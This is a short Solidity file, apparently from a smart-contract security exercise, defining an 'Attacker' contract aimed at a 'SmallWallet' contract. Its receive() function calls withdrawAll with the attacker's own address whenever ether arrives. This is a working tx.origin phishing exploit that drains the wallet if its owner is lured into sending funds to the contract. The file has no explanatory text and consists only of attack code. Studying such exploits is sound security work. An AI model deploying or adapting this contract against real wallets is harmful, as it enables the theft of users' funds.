// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IsSmallWallet {
    function withdrawAll(address _recipient) external;
}

contract Attacker is Ownable{
    IsSmallWallet public immutable smallWallet;

    constructor(IsSmallWallet _smallWallet){
        smallWallet = _smallWallet;
    }

    receive() external payable{
        smallWallet.withdrawAll(owner());
    }








}